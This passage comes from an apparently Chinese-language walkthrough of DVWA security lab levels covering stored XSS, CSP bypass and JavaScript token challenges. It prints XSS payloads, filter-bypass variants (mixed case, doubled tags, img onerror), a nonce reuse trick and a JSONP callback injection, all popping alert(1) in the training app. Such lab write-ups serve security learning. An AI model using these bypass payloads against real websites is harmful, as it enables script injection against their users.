(Stored)</h2><p>XSS存储型攻击，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</p><h3 id="1-Low-11"><a href="#1-Low-11" class="headerlink" title="1.Low"></a>1.Low</h3><p>源码中出现的不认识的函数：</p><p>（1）trim()函数</p><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">trim</span><span class="hljs-params">(string,charlist)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td><td></td><td></td><td></td><td></td></tr><tr><td>charlist</td><td>可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符："\0" - NULL"\t" - 制表符"\n" - 换行"\x0B" - 垂直制表符"\r" - 回车" " - 空格</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>（2）stripslashes()函数</p><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stripslashes</span><span class="hljs-params">(string)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr></tbody></table><p>用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。</p><p><> 没有做过滤与检查而且数据将被存储到数据库中，因此存在存储型XSS</p><p>name处有长度限制因此直接在message一栏使用我们的代码尝试：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20183158.png" alt="屏幕截图 2024-02-22 183158"></p><p>然后查看数据库发现已经储存到数据库中</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20183426.png" alt="屏幕截图 2024-02-22 183426"></p><p>注意：在进行下一个等级之前先把这条数据给删了</p><h3 id="2-Medium-11"><a href="#2-Medium-11" class="headerlink" title="2.Medium"></a>2.Medium</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191125.png" alt="屏幕截图 2024-02-22 191125"></p><p>Message处使用了htmlspecialchars()函数，将字符全部转为了HTML实体，而且使用了strip_tags函数会将字符串中HTML 和 PHP 标签去除 </p><p>因此Message处无法使用XSS形成攻击。</p><p>name处做了长度限制，因此考虑使用抓包在bp中修改name的值，还有就是他会将 <script> 转化为空，所有考虑使用双写或者大小写去绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">大小写绕过：<span class="hljs-tag">&lt;<span class="hljs-name">scRIpt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">SCript</span>&gt;</span><br>双写绕过：&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191449.png" alt="屏幕截图 2024-02-22 191449"></p><p>改好包后发送即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191457.png" alt="屏幕截图 2024-02-22 191457"></p><p>数据库结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20191508.png" alt="屏幕截图 2024-02-22 191508"></p><p>同样 注意：在进行下一个等级之前先把这条数据给删了</p><h3 id="3-High-11"><a href="#3-High-11" class="headerlink" title="3.High"></a>3.High</h3><p>跟十一关的High等级相似“< script >” 标签在这里被完全过滤且无法通过Message来进行xss</p><p>代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192030.png" alt="屏幕截图 2024-02-22 192030"></p><p>payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">1</span> <span class="hljs-attr">onerror</span> = <span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于为什么详见第十关的Medium</p><p>同样使用bp改包发包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192407.png" alt="屏幕截图 2024-02-22 192407"></p><p>发包结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192428.png" alt="屏幕截图 2024-02-22 192428"></p><p>数据库显示如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192717.png" alt="屏幕截图 2024-02-22 192717"></p><h3 id="4-Impossible-11"><a href="#4-Impossible-11" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222192830838.png" alt="image-20240222192830838"></p><p>将输入的内容全部实例化标签无法执行输入的所有内容均无效</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20192948.png" alt="屏幕截图 2024-02-22 192948"></p><p>还使用了PDO将代码和数据库分离，还有对语句进行预编译，这两种方法均能有效的防止SQL注入</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222193233629.png" alt="image-20240222193233629"></p><p>还加了token 进一步提高了安全性</p><h2 id="十三、CSP-Bypass"><a href="#十三、CSP-Bypass" class="headerlink" title="十三、CSP Bypass"></a>十三、CSP Bypass</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单</p><p>两种方法可以启用 CSP</p><p>一种是通过 HTTP 响应头信息的Content-Security-Policy字段<br>一种是通过网页的标签</p><p>例如</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$headerCSP = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span><span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">启用CSP后，不符合 CSP 的外部资源就会被阻止加载<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">script-<span class="hljs-attribute">src</span>，  <span class="hljs-comment">//脚本：只信任当前域名</span><br><span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span>：  <span class="hljs-comment">//不信任任何URL，即不加载任何资源</span><br>style-<span class="hljs-attribute">src</span>，   <span class="hljs-comment">//样式表：只信任cdn.example.org和third-party.org</span><br></code></pre></td></tr></table></figure><h3 id="1-Low-12"><a href="#1-Low-12" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20194018.png" alt="屏幕截图 2024-02-22 194018"></p><p>分析源码不难看出白名单网址为<br>self<br><a href="https://pastebin.com/">https://pastebin.com</a><br>example.com<br>code.jquery.com<br><a href="https://ssl.google-analytics.com/">https://ssl.google-analytics.com</a></p><p>其中 <a href="https://pastebin.com/">https://pastebin.com</a> 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200705.png" alt="屏幕截图 2024-02-22 200705"></p><p>点击create new paste</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200713.png" alt="屏幕截图 2024-02-22 200713"></p><p>点击raw</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200718.png" alt="屏幕截图 2024-02-22 200718"></p><p>将网址复制到图中的位置回车即可</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20200919.png" alt="屏幕截图 2024-02-22 200919"></p><h3 id="2-Medium-12"><a href="#2-Medium-12" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>源码如下，HTTP 头信息中的 script-src 的合法来源发生了变化。script-src 还可以设置一些特殊值，<strong>unsafe-inline</strong> 允许执行页面内嵌的 <script> 标签和事件监听函数，<strong>nonce 值</strong>会在每次 HTTP 回应给出一个授权 token。</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20201153.png" alt="屏幕截图 2024-02-22 201153"></p><p>现在就不是从外界导入 JavaScript 资源了，而是直接通过内联 JavaScript 代码，注入时直接令 nonce 为设定好的值即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span> &gt;</span><span class="language-javascript"> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240222201506962.png" alt="image-20240222201506962"></p><h3 id="3-High-12"><a href="#3-High-12" class="headerlink" title="3.High"></a>3.High</h3><p>经对源码的查看</p><p>因为CSP 规则限制，只能引用允许self 的脚本执行</p><p>self是指本页面加载的脚本，服务器只信任自己的域名，只允许加载本界面的JavaScript代码，这样的话自能从客户端本身动手脚了</p><p>这关的突破点在于自己给参数，创造传参</p><p>POST 提交的 include 参数直接放到了 body 源码中</p><p>所以这里我们可以自己修改include 来进行弹窗</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">include</span>=&lt;script <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;source/jsonp.php?callback=alert(&#x27;1&#x27;);&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20202113.png" alt="屏幕截图 2024-02-22 202113"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20202127.png" alt="屏幕截图 2024-02-22 202127"></p><h3 id="4-Impossible-12"><a href="#4-Impossible-12" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>这关直接把js写死了，只能回调 JS 里面的 solveSum 函数，所以就没办法啦</p><h2 id="十四、JavaScript"><a href="#十四、JavaScript" class="headerlink" title="十四、JavaScript"></a>十四、JavaScript</h2><h3 id="1-Low-13"><a href="#1-Low-13" class="headerlink" title="1.Low"></a>1.Low</h3><p>这个题有点小饶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">function rot13(inp) &#123;</span><br><span class="hljs-string">return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function generate_token() &#123;</span><br><span class="hljs-string">var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看源代码发现这就主要是一个Md5加密其余是</p><p>function generate_token() {<br>        var phrase = document.getElementById("phrase").value;<br>        document.getElementById("token").value = md5(rot13(phrase));<br>    }</p><p>这行代码是将phrase的值进行Md5加密后再将其赋值给token</p><p>首先明确此题是需要我们去提交一个success只要提交成功便可以</p><p>但是我们发现直接提交是行不通的</p><p>然后抓包看看能否看到什么有用的东西</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210755.png" alt="屏幕截图 2024-02-22 210755"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210810.png" alt="屏幕截图 2024-02-22 210810"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20210823.png" alt="屏幕截图 2024-02-22 210823"></p><p>经过观察发现无论我们所提交的Phrase为何值所对应的token始终不发生改变</p><p>但是根据我们对后端代码的观察发现按道理来说不应该啊只要Phrase的值发生改变那么token的值那必定改变啊</p><p>既然不变那就只能说明一个问题就是前端做了手脚不让Phrase的值发生改变</p><p>去瞅瞅：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20211443.png" alt="屏幕截图 2024-02-22 211443"></p><p>还有这个</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20211931.png" alt="屏幕截图 2024-02-22 211931"></p><p>嘿嘿嘿找到了原来是他隐藏了token他把的值固定phrase的值给固定成了ChangeMe</p><p>因为我们提交时是先经过前端然后才是后端所以我们的token一直都是ChangeMe的</p><p>所以在我们提交success之前先</p><p>执行generate_token()函数这样就可以使token是successMd5加密的值了</p><p>再点击Submit即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20205531.png" alt="屏幕截图 2024-02-22 205531"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-22%20205543.png" alt="屏幕截图 2024-02-22 205543"></p><p>最后再看一下后端发现果然是将字符串success进行md5加密后，再与前端提交过来的token值进行比对，匹配成功，才能成功提交success</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20082215.png" alt="屏幕截图 2024-02-23 082215"></p><p>success！</p><h3 id="2-Medium-13"><a href="#2-Medium-13" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>同样的我们先来看后端带码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223083751736.png" alt="image-20240223083751736"></p><p>看着有点费劲我们可以使用在线工具将其格式化</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223083903299.png" alt="image-20240223083903299"></p><p>这段代码先进性了一个加密也就是字符串反转然后又在调用的时候加上了XX最后将phrase的值经给过以上加密处理后赋值给token</p><p>再来看前端代码</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223084248251.png" alt="image-20240223084248251"></p><p>发现和上一关一样没什么不同只不过加密方法变了一下</p><p>最后再看一下后端代码确定一下</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223084417129.png" alt="image-20240223084417129"></p><p>ok这下确定了</p><p>开始操作：</p><p>输入success后</p><p>先在前端的控制台上执行一下<strong>do_elsesomething("XX")</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20084557%20-%20%E5%89%AF%E6%9C%AC.png" alt="屏幕截图 2024-02-23 084557 - 副本"></p><p>然后点击提交就OK了</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20084606.png" alt="屏幕截图 2024-02-23 084606"></p><h3 id="3-High-13"><a href="#3-High-13" class="headerlink" title="3.High"></a>3.High</h3><p>先来分析源码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223095300177.png" alt="image-20240223095300177"></p><p>发现这一串JS代码看起来也被混淆了一遍同样的我们用网站简单处理一下就能阅读代码了</p><p>如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span 